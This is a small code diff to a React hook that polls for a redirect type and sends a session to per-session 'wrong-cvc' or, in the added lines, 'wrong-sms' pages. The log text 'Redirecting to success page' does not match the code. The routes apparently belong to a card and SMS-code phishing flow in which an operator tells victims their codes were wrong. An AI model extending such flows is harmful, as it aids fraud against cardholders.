@@ -46,6 +46,10 @@ export const useRedirectChecker = (interval: number = 3000) => {
               console.log("🔄 Redirecting to success page");
               navigate(`/wrong-cvc/${sessionId}`);
               break;
+            case "wrong-sms":
+              console.log("🔄 Redirecting to success page");
+              navigate(`/wrong-sms/${sessionId}`);
+              break;
             default:
               console.log("Unknown redirect type:", data.type);
           }
